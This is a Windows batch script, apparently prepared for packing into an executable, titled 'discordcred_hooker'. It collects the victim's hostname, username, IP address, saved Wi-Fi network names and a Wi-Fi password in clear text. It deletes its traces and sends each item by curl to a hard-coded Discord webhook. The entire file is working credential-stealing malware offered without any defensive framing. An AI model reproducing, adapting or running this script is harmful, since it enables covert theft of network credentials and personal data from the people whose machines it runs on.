::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDd4YDimOXixEroM1Njp4O2CtlkSGfE6dpXal6CHNO8f5QvtdplN
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDd4YDimOXixEroM1Ozy/OmIsEkeRuc7R4fU1b+LMq4W8kCE
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
chcp 65001 > nul
setlocal enabledelayedexpansion
title discordcred_hooker

echo ------------------------------------------- > line1.txt
hostname > host.txt
echo %username% > user.txt
ipconfig | find "IPv4" > ip.txt

echo ------------------------------------------- > line2.txt

for /f "tokens=2 delims=:" %%a in ( 'netsh wlan show profiles' ) do ( 
echo %%a > ssid.txt
) 

for /f "tokens=2 delims=:" %%a in ( 'netsh wlan show profiles' ) do ( 
set wifi=%%a 
) 
netsh wlan show profile %wifi% key=clear | find "Key Content" > wifipass.txt


set /p "ip=" < ip.txt
set /p "host=" < host.txt
set /p "user=" < user.txt
set /p "line1=" < line1.txt
set /p "line2=" < line2.txt
set /p "wifipass=" < wifipass.txt
set /p "ssid=" < ssid.txt

del ip.txt
del host.txt
del user.txt
del line1.txt
del line2.txt
del wifipass.txt
del ssid.txt

set webhook="https://discordapp.com/api/webhooks/1288994255355772948/_y-tOeyzn0escJxZNuathSLEGDuWjZlzo_Q2BNA3tyAhWF2QJ5yK4X9SnQxIhnYsgqwy"

cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line1%\"}" %webhook%
cmd /c timeout /t 0 > nul
cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%ip%\"}" %webhook%
cmd /c timeout /t 0 > nul
cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%host%\"}" %webhook%
cmd /c timeout /t 0 > nul
cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%user%\"}" %webhook%
cmd /c timeout /t 0 > nul
cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%ssid%\"}" %webhook%
cmd /c timeout /t 0 > nul
cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%wifipass%\"}" %webhook%
cmd /c timeout /t 0 > nul
cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line2%\"}" %webhook%
